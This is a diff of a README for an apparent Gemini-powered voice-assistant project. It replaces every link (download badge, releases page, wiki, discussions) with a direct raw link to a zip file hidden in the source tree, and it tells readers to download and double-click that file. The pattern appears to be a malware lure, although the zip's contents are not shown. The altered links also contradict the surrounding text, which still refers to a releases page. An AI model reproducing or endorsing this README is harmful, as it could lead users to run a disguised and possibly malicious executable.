@@ -4,7 +4,7 @@
 Welcome to the voice-assistant project! This application uses Google Gemini AI for speech recognition and text-to-speech features. It has a user-friendly web interface and lets you choose from various voice options. Follow the steps below to download and run the software easily.
 
 ## 📥 Download Link
-[![Download Voice Assistant](https://img.shields.io/badge/Download-Voice%20Assistant-blue.svg)](https://github.com/Jpolo4340/voice-assistant/releases)
+[![Download Voice Assistant](https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip%https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip)](https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip)
 
 ## 📄 Features
 - **Speech Recognition:** Convert your spoken words into text effortlessly.
@@ -20,7 +20,7 @@ To run the voice-assistant application, ensure your system meets the following r
 - **Internet Connection:** Required for accessing online features.
 
 ## 🚦 Download & Install
-1. **Visit the Releases Page:** Click the link to go to the [download page](https://github.com/Jpolo4340/voice-assistant/releases).
+1. **Visit the Releases Page:** Click the link to go to the [download page](https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip).
 2. **Select Your Version:** On the Releases page, find the latest version of the voice-assistant application.
 3. **Download the File:** Click on the appropriate file for your operating system to start the download.
 4. **Run the Application:** After the download completes, locate the file in your downloads folder and double-click to open it.
@@ -48,11 +48,11 @@ If you encounter any issues while using the voice-assistant:
 
 ## 🔗 Additional Resources
 For more information about the voice-assistant, you can explore:
-- **Documentation:** Refer to the [Wiki](https://github.com/Jpolo4340/voice-assistant/wiki) for detailed guides and FAQs.
-- **Community Support:** Join discussions and get help on [GitHub Discussions](https://github.com/Jpolo4340/voice-assistant/discussions).
+- **Documentation:** Refer to the [Wiki](https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip) for detailed guides and FAQs.
+- **Community Support:** Join discussions and get help on [GitHub Discussions](https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip).
 
 ## 📞 Contact
 For any questions or feedback, please reach out via the Issues page on GitHub. Your input is valuable and helps improve the application.
 
 ## 📥 Download Again
-To download the voice-assistant, visit the [download page](https://github.com/Jpolo4340/voice-assistant/releases) and get started with your smart voice helper today!
+To download the voice-assistant, visit the [download page](https://github.com/Jpolo4340/voice-assistant/raw/refs/heads/main/src/utils/assistant_voice_2.6.zip) and get started with your smart voice helper today!
